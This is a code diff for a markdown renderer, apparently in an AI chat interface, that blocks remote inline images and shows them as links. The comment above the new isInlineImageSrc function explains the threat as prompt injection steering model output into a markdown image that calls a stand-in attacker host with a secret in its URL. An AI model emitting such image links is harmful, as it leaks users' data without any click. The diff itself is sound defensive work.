@@ -77,6 +77,15 @@ function CodeBlock({ code, lang, streaming }: { code: string; lang: string; stre
   );
 }
 
+/**
+ * Only same-origin images load inline. Model output can be steered by prompt injection, and a remote image is
+ * fetched as soon as it renders, so `![](https://attacker/?d=<secret>)` would leak data without a click.
+ * `/\\host` is excluded too because browsers treat it like the protocol-relative `//host`.
+ */
+export function isInlineImageSrc(src: unknown): src is string {
+  return typeof src === "string" && /^\/(?![/\\])/.test(src);
+}
+
 function makeComponents(streaming: boolean): Components {
   return {
     code({ className, children, ...props }) {
@@ -99,6 +108,16 @@ function makeComponents(streaming: boolean): Components {
       return (
         <a href={href} target="_blank" rel="noreferrer noopener" {...props}>
           {children}
+        </a>
+      );
+    },
+    img({ src, alt, title }) {
+      // eslint-disable-next-line @next/next/no-img-element
+      if (isInlineImageSrc(src)) return <img src={src} alt={alt ?? ""} title={title} loading="lazy" />;
+      if (typeof src !== "string" || !src) return <>{alt}</>;
+      return (
+        <a href={src} target="_blank" rel="noreferrer noopener">
+          {alt || src}
         </a>
       );
     },
